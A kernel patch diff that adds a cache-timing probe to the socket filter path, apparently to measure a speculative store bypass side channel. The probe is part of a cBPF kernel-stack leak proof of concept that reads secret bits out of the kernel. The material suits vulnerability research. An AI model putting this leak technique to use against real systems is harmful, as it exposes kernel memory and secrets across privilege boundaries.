@@ -95,6 +95,16 @@
  * bpf_dispatcher_nop_func writes to this before every bpf_func call. */
 u8 cbpf_poc_m0_stale;
 
+/* Frag-signal probe layout -- MUST match cbpf/zc_kstack_leak.c.
+ * ARCH = frag[1] (M[0]=0 architectural P[X] target, warmed every call);
+ * SIG  = frag[9] (speculative SSB P[X] target, warmed iff stale bit = 1);
+ * COLD = frag[5] (never addressed; noise floor).  HDR is the byte offset the
+ * gadget reads within a frag page, so we time the same 64B line. */
+#define CPOC_HDR        32u
+#define CPOC_ARCH_FRAG  1
+#define CPOC_SIG_FRAG   9
+#define CPOC_COLD_FRAG  5
+
 /* Coldness probe: for each filtered skb, time the first access to the payload
  * byte at filter-run time (the "cold?" question), plus a warm reference (second
  * access) and a flushed reference (clflush then access) measured in the same
@@ -171,9 +181,69 @@ static void cbpf_poc_flush_payload(struct sk_buff *skb)
 }
 #endif
 
+/* Post-filter frag-signal probe.  Called from sk_filter_trim_cap immediately
+ * after the cBPF program runs, while the speculatively-warmed line is still hot
+ * in this CPU's L1 -- the cleanest possible readout of the transient access,
+ * with no TCP_ZEROCOPY_RECEIVE remap, no RX->getsockopt gap and no cross-probe
+ * drift (ARCH/SIG/COLD are all timed in one irq-disabled window on one CPU).
+ *
+ * The CSUM_OFFLOAD flush left every frag cold before the filter.  The filter's
+ * architectural P[X] (M[0]=0 path) warms ARCH every call; its speculative P[X]
+ * (stale bit=1) warms SIG only if the SSB transient load lands.  Per packet:
+ * thr = (lat_arch + lat_cold)/2 is a drift-free warm/cold divider measured in
+ * the same instant; SIG below it is counted as a speculative hit.  We also
+ * count the threshold-free vote lat_sig < lat_cold.  Userspace deltas the
+ * counters across a gadget(bit) phase to read the secret bit out of the kernel
+ * directly, isolating the transient mechanism from the userspace channel SNR. */
+static u64 csig_n, csig_warm, csig_arch_warm, csig_cold_warm, csig_lt_cold;
+static u64 csig_sum, carch_sum, ccold_sum;
+
+static noinline void cbpf_poc_probe_signal(struct sk_buff *skb)
+{
+	const skb_frag_t *fa, *fs, *fc;
+	const volatile u8 *pa, *ps, *pc;
+	unsigned long flags;
+	u64 t0, la, ls, lc, thr;
+	u8 sink;
+
+	if (skb_shinfo(skb)->nr_frags <= CPOC_SIG_FRAG)
+		return;
+	fa = &skb_shinfo(skb)->frags[CPOC_ARCH_FRAG];
+	fs = &skb_shinfo(skb)->frags[CPOC_SIG_FRAG];
+	fc = &skb_shinfo(skb)->frags[CPOC_COLD_FRAG];
+	if (!skb_frag_page(fa) || !skb_frag_page(fs) || !skb_frag_page(fc))
+		return;
+	if (skb_frag_size(fa) <= CPOC_HDR || skb_frag_size(fs) <= CPOC_HDR ||
+	    skb_frag_size(fc) <= CPOC_HDR)
+		return;
+	pa = (const volatile u8 *)page_address(skb_frag_page(fa)) + skb_frag_off(fa) + CPOC_HDR;
+	ps = (const volatile u8 *)page_address(skb_frag_page(fs)) + skb_frag_off(fs) + CPOC_HDR;
+	pc = (const volatile u8 *)page_address(skb_frag_page(fc)) + skb_frag_off(fc) + CPOC_HDR;
+	if (!virt_addr_valid((const void *)pa) || !virt_addr_valid((const void *)ps) ||
+	    !virt_addr_valid((const void *)pc))
+		return;
+
+	/* SIG first (least decay), then the warm (ARCH) and cold (COLD) refs. */
+	local_irq_save(flags);
+	t0 = rdtsc_ordered(); sink = *ps; ls = rdtsc_ordered() - t0;
+	t0 = rdtsc_ordered(); sink = *pa; la = rdtsc_ordered() - t0;
+	t0 = rdtsc_ordered(); sink = *pc; lc = rdtsc_ordered() - t0;
+	local_irq_restore(flags);
+	(void)sink;
+
+	csig_n++;
+	csig_sum += ls; carch_sum += la; ccold_sum += lc;
+	thr = (la + lc) / 2;
+	if (ls <= thr) csig_warm++;
+	if (la <= thr) csig_arch_warm++;	/* sanity: ARCH should be ~always warm */
+	if (lc <= thr) csig_cold_warm++;	/* sanity: COLD should be ~never warm  */
+	if (ls <  lc)  csig_lt_cold++;		/* threshold-free SIG-faster-than-COLD */
+}
+
 static int cbpf_poc_show(struct seq_file *m, void *v)
 {
 	u64 n = cpoc_n ? cpoc_n : 1;
+	u64 sn = csig_n ? csig_n : 1;
 
 	seq_printf(m, "stale=0x%02x\n", (unsigned int)cbpf_poc_m0_stale);
 	seq_printf(m, "coldprobe n=%llu nfrag=%llu\n", cpoc_n, cpoc_nfrag);
@@ -182,6 +252,12 @@ static int cbpf_poc_show(struct seq_file *m, void *v)
 		   cpoc_first_min == ~0ULL ? 0 : cpoc_first_min, cpoc_first_max);
 	seq_printf(m, "lat_warm_avg=%llu lat_flushed_avg=%llu\n",
 		   cpoc_warm_sum / n, cpoc_flush_sum / n);
+	seq_printf(m, "sig n=%llu warm=%llu arch_warm=%llu cold_warm=%llu lt_cold=%llu\n",
+		   csig_n, csig_warm, csig_arch_warm, csig_cold_warm, csig_lt_cold);
+	seq_printf(m, "sig_lat_avg=%llu arch_lat_avg=%llu cold_lat_avg=%llu\n",
+		   csig_sum / sn, carch_sum / sn, ccold_sum / sn);
+	seq_printf(m, "sig_sum=%llu arch_sum=%llu cold_sum=%llu\n",
+		   csig_sum, carch_sum, ccold_sum);
 	return 0;
 }
 
@@ -275,6 +351,9 @@ sk_filter_trim_cap(struct sock *sk, struct sk_buff *skb, unsigned int cap)
 		cbpf_poc_probe_coldness(skb);	/* verify: lat_first should now be cold */
 #endif
 		pkt_len = bpf_prog_run_save_cb(filter->prog, skb);
+#ifdef CONFIG_CBPF_KSTACK_POC
+		cbpf_poc_probe_signal(skb);	/* time frags while SIG line still L1-hot */
+#endif
 		skb->sk = save_sk;
 		err = pkt_len ? pskb_trim(skb, max(cap, pkt_len)) : -EPERM;
 		if (err)
